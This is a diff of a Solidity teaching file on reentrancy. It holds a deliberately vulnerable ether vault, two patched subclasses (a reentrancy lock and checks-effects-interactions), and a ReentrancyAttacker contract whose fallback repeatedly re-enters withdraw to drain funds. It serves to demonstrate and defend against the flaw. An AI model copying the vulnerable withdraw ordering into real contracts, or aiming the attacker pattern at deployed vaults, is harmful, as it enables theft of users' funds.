@@ -8,7 +8,7 @@ contract VulnerableEtherVault {
         balances[msg.sender] += msg.value;
     }
 
-    function withdraw() external {
+    function withdraw() public virtual{
         uint256 amount = balances[msg.sender];
         require(amount > 0, "nothing to withdraw");
 
@@ -23,30 +23,7 @@ contract VulnerableEtherVault {
     }
 }
 
-contract ReentrancyAttacker {
-    VulnerableEtherVault public immutable TARGET;
-    uint256 public attackAmount;
-
-    constructor(address targetAddress) {
-        TARGET = VulnerableEtherVault(targetAddress);
-    }
-
-    function attack() external payable {
-        require(msg.value > 0, "seed required");
-        attackAmount = msg.value;
-        TARGET.deposit{value: msg.value}();
-        TARGET.withdraw();
-    }
-
-    receive() external payable {
-        if (address(TARGET).balance >= attackAmount) {
-            TARGET.withdraw();
-        }
-    }
-}
-
-contract FixedEtherVault {
-    mapping(address => uint256) public balances;
+contract PatchedEtherVaultModifier is VulnerableEtherVault {
     bool private locked;
 
     modifier nonReentrant() {
@@ -56,11 +33,13 @@ contract FixedEtherVault {
         locked = false;
     }
 
-    function deposit() external payable {
-        balances[msg.sender] += msg.value;
+    function withdraw() public override nonReentrant {
+        super.withdraw();
     }
+}
 
-    function withdraw() external nonReentrant {
+contract PatchedEtherVaultCEIPattern is VulnerableEtherVault {
+    function withdraw() public override {
         uint256 amount = balances[msg.sender];
         require(amount > 0, "nothing to withdraw");
 
@@ -69,18 +48,14 @@ contract FixedEtherVault {
         (bool success,) = msg.sender.call{value: amount}("");
         require(success, "send failed");
     }
-
-    function vaultBalance() external view returns (uint256) {
-        return address(this).balance;
-    }
 }
 
-contract FailedReentrancyAttacker {
-    FixedEtherVault public immutable TARGET;
+contract ReentrancyAttacker {
+    VulnerableEtherVault public immutable TARGET;
     uint256 public attackAmount;
 
     constructor(address targetAddress) {
-        TARGET = FixedEtherVault(targetAddress);
+        TARGET = VulnerableEtherVault(targetAddress);
     }
 
     function attack() external payable {
